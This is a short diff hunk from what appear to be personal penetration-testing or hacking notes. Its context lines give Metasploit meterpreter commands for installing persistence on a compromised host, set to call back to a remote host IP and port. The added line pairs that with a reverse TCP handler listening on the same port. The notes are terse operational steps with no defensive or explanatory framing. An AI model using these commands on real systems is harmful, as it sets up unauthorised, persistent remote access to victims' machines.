@@ -135,4 +135,6 @@ No need to do all the crap again
 (meterpreter)> run persistence -h  				       ///may take multiple tries
 (meterpreter)> run persistence -r <Remost host IP> -p <number> -U     ///may take multiple tries
 
+use exploit such as a reverse tcp and set the LPORT in the options to the port used in persistence command
+
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
